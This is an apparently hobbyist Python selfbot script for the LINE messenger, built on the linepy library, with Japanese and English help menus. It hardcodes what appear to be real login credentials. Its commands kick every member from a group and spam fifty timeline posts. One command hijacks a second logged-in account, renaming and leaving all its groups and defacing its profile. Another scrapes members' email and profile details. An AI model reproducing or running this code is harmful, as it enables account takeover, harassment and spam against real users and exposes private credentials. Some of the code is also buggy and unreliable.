from linepy import *
import random
import os
import time
LoginArt = """
====[login now...]===
O  O  OOO    OOO   OOOOO
O O   O  O  O   O    O  
OO    OOO   O   O    O
O O   O  O  O   O    O
O  O  OOO    OOO     O

====[kbot ver.3]=====

"""
logo = """
[kbot ver.3]
O    O
O  O
OO
O  O
O    O

OOOOO
O    O
OOOOO
O    O
OOOOO

 OOO
O   O
O   O
O   O
 OOO 

OOOOO
  O
  O
  O
  O
"""
newpassword=0
password = 0
password = input("password?:")
if password == "114514":
	print("パスワード合致、ログインします")
	print(LoginArt)
	client = LINE('yk.20050513.t@gmail.com','yuyuyu20050513')
	client.log("Auth Token :"+str(client.authToken))
	oepoll = OEPoll(client)
elif password != "114514":
	print("パスワードが違います、再試行してください")

infnity = 0;
def helpMessage():
	helpMessage = """
╔══✟HELP✟══
║help➣このヘルプメッセージを表示します
╠❃aflc❃➣(All Friend List Contact)全友達の連絡先を送信します
╠❃tlmacro❃➣50発タイムラインマクロを撃ちます
╠❃gi❃➣(Group Info)グループの内部的な情報を表示します
╠❃ka❃➣全蹴りします
╠❃info @❃➣メンションした相手の詳細な情報を表示します
╠❃member❃➣メンバーを確認します
╠❃start❃➣ストップウォッチを起動します
╠❃stop❃➣ストップウォッチを停止しま
╠❃God❃➣ゴッドモードに入りグループから退会されなくなります（開発中）
╠❃leave❃➣退会します
╠❃ccm❃➣(CommandPrompt Chat Mode)ターミナル（コマンドプロンプト）内でメッセージを入力・送信します
╠❃cg❃➣(Create Group)
╠═══[機能]══
╠☬CommandPromptChatIndicator☬➣コマンドプロンプト上でチャット情報を監視します(ccmとの併用が便利)
╠═[ver.1.0]═
╚[Created by kouta] 

	"""
	return helpMessage

def EnglishHelpMessage():
	EnglishHelpMessage = """
╔══✟HELP✟══
║help➣indicate this message
╠❃aflc❃➣(All Friend List Contact)send your all friends list
╠❃tlmacro❃➣send 50 timeline posts(macro)
╠❃gi❃➣(Group Info)indicate system info of your group
╠❃ka❃➣kick all members
╠❃leave❃➣leave this group
╠❃ccm❃➣(CommandPrompt Chat Mode)input and send your messages on your terminal(cmd)
╠❃cg❃➣Create Group
╠❃word❃➣Indicate Quotes
╠❃info @❃➣
╠═══[機能]══
╠☬CommandPromptChatIndicator☬➣indicate the receive messages,sender name etc... on your cmd
╠═[ver.1.0]═
╚[Created by kouta] 
	"""
	return EnglishHelpMessage

word1 = """THE QUIETER YOU BECOME,\n
MORE YOU CAN HEAR\n
~Ram Dass"""
word2 = """You only live once,\n
but if you do it right,\n
once is enough"""
word3 = """Only I can change my life.\n
No one can do it for me."""
word4 = """Change before you have to."""

words = [word1,word2,word3,word4]
def SEND_MESSAGE(op):
	msg = op.message

	text = msg.text
	to = msg.to
	me = "u1505299bc3e6d961c34321d34e2aa415"
	mids = client.getAllContactIds()
	sender = msg._from
	tlcount = 0
	kacount = 0
	count = 1
	try:
		if msg.contentType == 0:
				groupinfo = client.getGroupWithoutMembers(to)
				contact = client.getContact(sender)
				txt = '[%s] %s' % (contact.displayName, text)
				print(txt)
				cmd = "title :%s"%(groupinfo.name)
				os.system(cmd)
		if text.lower() == 'help':
			helpmessage = helpMessage()
			client.sendMessage(to,str(helpmessage))		
		elif text.lower() == 'all':
			account = client.getContact(mids[1])
			client.sendMessage(to,str(account))
		elif text.lower() == 'cg':
			client.createGroup("test",str(mids))
		elif text.lower() == 'aflc':	
			for mid in mids:
					client.sendContact(to,(mid))
		elif msg.text == "全蹴り":
                    group=client.getGroup(to)
                    MM = [contact.mid for contact in group.members]
                    for x in group.members:
                        try:
                            MM.remove(x)
                        except:
                              pass
                    for k in MM:
                        client.kickoutFromGroup(to,[k])
		elif text.lower() == 'tlmacro':
			while tlcount != 50:
				client.createPost("testmacro(auto post macro)")
				client.sendMessage(to,"Success this action")
				tlcount = tlcount + 1
		elif text.lower() == 'logo':
			client.sendMessage(to,logo)
		elif text.lower() == 'gi':
			print(groupinfo)
		elif text.lower() == 'member':
			gdir = client.getGroup(to)
			print(to,(gdir.members[0].mid))
			client.sendMessage(to,(gdir.members[0].mid))
		elif text.lower() == 'leave':
			client.sendMessage(to,"退会します")
			client.leaveGroup(to)
		elif text.lower() == 'search':
			client.sendMessage(to,"Google↓")
			client.sendMessage(to,"https://www.google.com")
		elif text.lower() == 'word':
			word = random.choice(words)
			client.sendMessage(to,str(word))
		elif text.lower() == '乗っ取りうらる作成':
			destroy = LINE()
			dmids = destroy.getAllContactIds()
			dgids = destroy.getGroupIdsJoined()
			for dgid in dgids:
				X = destroy.getGroup(dgid)
				X.name = "/アホ/"
				destroy.updateGroup(X)
				destroy.leaveGroup(dgid)
			dp = destroy.getProfile()
			dp.displayName = "天才ハッカーが乗っ取ってみたwww"
			dp.statusMessage = "俺イケメン"
			destroy.updateProfile(dp)
		elif text.lower() == 'ccm':
			cmdmsgs = "nothing"
			while 1==1:
				cmdmsgs = input("Message:")
				client.sendMessage(to,str(cmdmsgs))
		elif text.lower() == 'start':
			client.sendMessage(to,"測定開始")
			start = time.time()
		elif text.lower() == 'stop':
			time = time.time() - start
			client.sendMessage(to,"経過時間:" + time + "秒")
		elif msg.text.lower().startswith('link '):
			if 'MENTION' in msg.contentMetadata.keys() != None:
				mention = eval(msg.contentMetadata['MENTION'])
				mentionees = mention['MENTIONEES']
				lists = []
				for mention in mentionees:
					if mention["M"] not in lists:
						lists.append(mention["M"])
				for ls in lists:
					contact = client.getContact(ls)
					mi_d = contact.mid
					minfo = client.getContact(mi_d)
					print(str(minfo))
					client.sendMessage(to,"Add URL:"+"line://ti/p" + str(mi_d))
		elif text.lower() == 'enghelp':
			enghelp = EnglishHelpMessage()
			client.sendMessage(to,str(enghelp))
		elif text.lower() == 'd':
			client.sendMessage(to,"デデドン（絶望）")
			client.sendAudio(to,'d.mp3')
		elif text.lower() == '黒塗りの高級車':
			client.sendMessage(to,"""試合を終えて家路へ向かうサッカー部員達。
        	        	        	疲れからか、不幸にも黒塗りの高級車に追突してしまう。後輩をかばいすべての責任を負った三浦に対し、
        	        	        	車の主、暴力団員谷岡に言い渡された示談の条件とは・・・。
        	        	        	""")
		elif msg.text.lower().startswith("info "):
			if 'MENTION' in msg.contentMetadata.keys() != None:
				mention = eval(msg.contentMetadata['MENTION'])
				mentionees = mention['MENTIONEES']
				lists = []
				for mention in mentionees:
					if mention["M"] not in lists:
						lists.append(mention["M"])
				for ls in lists:
					contact = client.getContact(ls)
					mi_d = contact.mid
					minfo = client.getContact(mi_d)
					print(str(minfo))
					client.sendContact(to,mi_d)
					client.sendMessage(to,"名前:" + str(minfo.displayName))
					client.sendMessage(to,"ステータスメッセージ:" + str(minfo.statusMessage))
					client.sendMessage(to,"mid:" + str(minfo.mid))
		elif msg.text.lower().startswith("cr "):
			if 'MENTION' in msg.contentMetadata.keys() != None:
				mention = eval(msg.contentMetadata['MENTION'])
				mentionees = mention['MENTIONEES']
				lists = []
				for mention in mentionees:
					if mention["M"] not in lists:
						lists.append(mention["M"])
				for ls in lists:
					contact = client.getContact(ls)
					mi_d = contact.mid
					client.createRoom(mi_d)
		elif text.lower() == 'God':
			ticket = client.reissueGroupTicket(to)
			for god in ticket:
				if op.type == 24:
					client.acceptGroupInvitationByTicket(to,str(god))
		elif text.lower() == 'gp':
			gmids = client.getGroup(to)
			gp = client.cloneContactProfile(gmids.members[0].mid)
			print(gp)
			client.sendContact(to,(gp.mid))
			client.sendMessage(to,"userid:"+str(gp.userid))
			client.sendMessage(to,"Email:"+str(gp.email))
			client.sendMessage(to,"name:"+str(gp.displayName))			
			client.sendMessage(to,"Status Message:"+str(gp.statusMessage))
			client.sendImage(to,str(gp.picturePath))
			client.sendMessage(to,"==END==")

	except Exception as e:
		client.log("[SEND_MESSAGE]ERROR :"+ str(e))

oepoll.addOpInterruptWithDict({
	OpType.SEND_MESSAGE: SEND_MESSAGE,

})

while True:
	oepoll.trace()